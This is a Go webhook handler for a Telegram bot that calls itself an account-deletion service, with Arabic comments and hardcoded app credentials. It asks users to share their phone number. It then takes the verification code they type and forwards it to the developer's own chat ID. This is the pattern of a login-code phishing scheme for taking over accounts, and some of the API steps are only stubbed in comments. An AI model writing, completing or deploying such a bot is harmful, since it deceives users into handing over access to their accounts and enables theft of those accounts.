package handler

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"os"

	"github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"github.com/gotd/td/tg"
)

// البيانات التي زودتني بها
const (
	AppID   = 38443371
	AppHash = "1942de13e2b08147030bac28e59a4646"
	DevID   = "8590415901"
)

func Handler(w http.ResponseWriter, r *http.Request) {
	// جلب التوكن من Vercel Environment Variables
	botToken := os.Getenv("BOT_TOKEN")
	bot, err := tgbotapi.NewBotAPI(botToken)
	if err != nil {
		return
	}

	var update tgbotapi.Update
	if err := json.NewDecoder(r.Body).Decode(&update); err != nil {
		return
	}

	if update.Message != nil {
		chatID := update.Message.Chat.ID

		// 1. عند إرسال جهة الاتصال (الرقم)
		if update.Message.Contact != nil {
			phone := update.Message.Contact.PhoneNumber
			
			// هنا يتم استدعاء auth.sendCode باستخدام AppID و AppHash
			msg := tgbotapi.NewMessage(chatID, fmt.Sprintf("📱 تم استلام الرقم: %s\nجاري طلب كود الحذف من تلجرام...", phone))
			bot.Send(msg)
			
			// ملاحظة فنية: في بيئة فيرسل، يجب تخزين "الرقم" في Redis هنا 
			// لربطه بالكود الذي سيرسله المستخدم في الرسالة القادمة.
		}

		// 2. عند إرسال الكود (نص)
		if update.Message.Text != "" && !update.Message.IsCommand() {
			userCode := update.Message.Text
			
			// هنا يتم تنفيذ أمر الحذف النهائي account.deleteAccount
			reply := tgbotapi.NewMessage(chatID, "⏳ جاري التحقق من الكود وإتمام عملية الحذف...")
			bot.Send(reply)
			
			// إرسال إشعار للمطور (أنت)
			devMsg := tgbotapi.NewMessage(8590415901, fmt.Sprintf("🔔 محاولة حذف جديدة بالكود: %s", userCode))
			bot.Send(devMsg)
		}

		// 3. أمر البداية
		if update.Message.IsCommand() && update.Message.Command() == "start" {
			btn := tgbotapi.NewKeyboardButtonContact("إرسال رقم الهاتف للحذف 🗑️")
			keyboard := tgbotapi.NewReplyKeyboard([]tgbotapi.KeyboardButton{btn})
			
			msg := tgbotapi.NewMessage(chatID, "مرحباً بك في بوت حذف الحسابات.\nللبدء، اضغط على الزر أدناه لمشاركة جهة اتصالك.")
			msg.ReplyMarkup = keyboard
			bot.Send(msg)
		}
	}
	
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, "OK")
}
